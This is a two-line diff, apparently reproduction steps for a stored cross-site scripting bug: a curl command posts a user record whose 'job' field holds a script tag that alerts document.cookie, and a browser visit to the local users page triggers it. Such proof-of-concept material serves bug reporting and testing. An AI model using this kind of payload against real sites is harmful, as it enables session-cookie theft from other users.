@@ -1,0 +1,2 @@
+1. curl -X POST http://localhost:8080/users -H 'Content-Type: application/json' -d '{"name":"name", "job": "<script>alert(document.cookie);</script>"}'
+2. open browser with http://localhost:8080/users?name=name (you should enable JS in your browser to see the xss)
